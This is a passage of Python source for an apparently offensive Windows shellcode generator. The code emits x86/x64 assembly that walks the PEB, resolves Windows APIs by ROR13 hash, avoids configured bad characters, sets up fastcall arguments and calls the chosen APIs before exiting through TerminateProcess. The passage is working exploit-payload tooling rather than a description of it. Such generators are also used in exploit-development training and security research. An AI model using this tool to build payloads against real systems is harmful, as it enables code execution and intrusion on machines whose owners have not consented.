            string_cache: Dict of cached string pointers

        Returns:
            str: Assembly code
        """
        reg_refs = self._get_reg_refs(args)

        # If any arg references RAX (return value from previous call),
        # save it before string preparation clobbers it
        save_reg = None
        if "rax" in reg_refs:
            has_strings = any(
                isinstance(a, str)
                and not a.startswith(("STR_PTR:", "REG:", "MEM:"))
                for a in args
            )
            if has_strings:
                save_reg = "rbx"
                args = [
                    f"REG:{save_reg}" if (isinstance(a, str) and a == "REG:rax")
                    else a
                    for a in args
                ]
                reg_refs = self._get_reg_refs(args)

        lines = []
        if save_reg:
            lines.append(
                f"    mov {save_reg}, rax"
                f"            ; save return value for {api_name}"
            )

        prep_lines, string_to_reg = self._prepare_x64_string_args(args, api_name)
        lines.extend(prep_lines)

        # x64 fastcall: RCX, RDX, R8, R9, then stack
        param_regs = ["rcx", "rdx", "r8", "r9"]

        lines.append(
            f"\n; Setup arguments for {api_name} (x64 fastcall: RCX, RDX, R8, R9, stack)"
        )

        # First 4 arguments go into registers
        for i, arg in enumerate(args[:4]):
            lines.extend(
                self._resolve_x64_reg_arg(
                    arg, i, param_regs[i], string_cache, string_to_reg,
                    reg_refs,
                )
            )

        # Args 5+ go on stack in reverse order
        if len(args) > 4:
            lines.append("\n; Push remaining arguments (5+) onto stack")
            for i in range(len(args) - 1, 3, -1):
                lines.extend(
                    self._push_x64_stack_arg(
                        args[i], i, string_cache, string_to_reg, reg_refs
                    )
                )

        # Shadow space + call
        lines.append(f"\n; Call {api_name} with shadow space")
        lines.append("    sub rsp, 0x20           ; Allocate shadow space (32 bytes)")
        lines.append(f"    call qword ptr [rbp+0x{api_offset:02x}]  ; Call {api_name}")

        # Clean up stack: shadow space + any args beyond 4
        stack_cleanup = 0x20  # Shadow space
        if len(args) > 4:
            stack_cleanup += (len(args) - 4) * 8  # Each pushed arg is 8 bytes

        if stack_cleanup > 0:
            lines.append(
                f"    add rsp, 0x{stack_cleanup:x}       ; Clean up shadow space + stack args"
            )

        return "\n".join(lines)

    def generate(self, config):
        """
        Generate complete Windows shellgen from a config dict.

        Args:
            config: Dict with 'bad_chars', 'calls', 'exit' keys

        Returns:
            str: Complete assembly code
        """
        calls = config.get("calls", [])
        do_exit = config.get("exit", True)

        # Consolidate reused strings
        calls, string_cache = self.consolidate_strings(calls)

        output = []
        output.append("; " + "=" * 70)
        output.append(f"; Auto-generated {self.arch.upper()} Windows Shellcode")
        output.append(f"; Architecture: {self.arch}")
        output.append(
            f"; Bad chars: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}"
        )
        output.append("; " + "=" * 70)
        output.append("")

        # Boilerplate (PEB walk + find_function subroutine)
        output.append(self.gen_boilerplate())

        # Pre-resolve all APIs BEFORE pushing any data onto the stack
        # Include exit APIs (GetCurrentProcess, TerminateProcess) if do_exit=True
        preresolve_code, api_to_offset = self.gen_pre_resolve_apis(
            calls, include_exit_apis=do_exit
        )
        output.append(preresolve_code)
        output.append("")

        # Push cached strings AFTER resolving APIs
        if string_cache:
            output.append(
                "\n; =========================================================================="
            )
            output.append("; String cache (reused strings)")
            output.append(
                "; =========================================================================="
            )
            for string_val, reg_name in string_cache.items():
                output.append(self.gen_push_string(string_val))
                output.append(
                    f'    mov {reg_name}, ecx      ; cache pointer to "{string_val[:30]}..."'
                )
            output.append("")

        # Call pre-resolved APIs
        for i, call in enumerate(calls):
            # Handle custom assembly blocks
            if call.get("custom_asm"):
                output.append(
                    "\n; =========================================================================="
                )
                output.append(
                    f"; Call #{i + 1}: {call['api']}({', '.join(str(a) for a in call['args'])})"
                )
                output.append(
                    "; =========================================================================="
                )
                output.append(call.get("custom_asm"))
                output.append("")
                continue

            api_name = call["api"]
            api_offset = api_to_offset[api_name]

            output.append(
                "\n; =========================================================================="
            )
            output.append(
                f"; Call #{i + 1}: {api_name}({', '.join(str(a) for a in call['args'])})"
            )
            output.append(
                "; =========================================================================="
            )
            output.append(
                self.gen_api_call_preresolve(
                    api_name, call["args"], api_offset, string_cache
                )
            )
            output.append("")

        # Exit
        if do_exit:
            output.append(self.gen_exit_shellcode(api_to_offset))

        full_asm = "\n".join(output)

        # Print summary to stderr
        print("=" * 72, file=sys.stderr)
        print("SHELLCODE GENERATOR OUTPUT", file=sys.stderr)
        print("=" * 72, file=sys.stderr)
        print(
            f"Bad characters: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}",
            file=sys.stderr,
        )
        print(f"API calls:      {len(calls)}", file=sys.stderr)
        for i, call in enumerate(calls):
            print(
                f"  [{i + 1}] {call['api']}({', '.join(str(a)[:50] for a in call['args'])})",
                file=sys.stderr,
            )
        print(f"Clean exit:     {do_exit}", file=sys.stderr)
        if string_cache:
            print(f"Cached strings: {len(string_cache)}", file=sys.stderr)
        print("=" * 72, file=sys.stderr)

        # Print hashes in a colored panel
        hash_lines = []
        hash_lines.append(f"LoadLibraryA      : 0x{ror13_hash('LoadLibraryA'):08x}")
        for call in calls:
            hash_lines.append(f"{call['api']:18s}: 0x{ror13_hash(call['api']):08x}")
        if do_exit:
            hash_lines.append(
                f"GetCurrentProcess : 0x{ror13_hash('GetCurrentProcess'):08x}"
            )
            hash_lines.append(
                f"TerminateProcess  : 0x{ror13_hash('TerminateProcess'):08x}"
            )

        hash_content = "\n".join(hash_lines)
        print()  # Add spacing
        printer.print_panel(
            hash_content, title="ROR13 API Hashes", style="yellow", border_style="cyan"
        )

        return full_asm
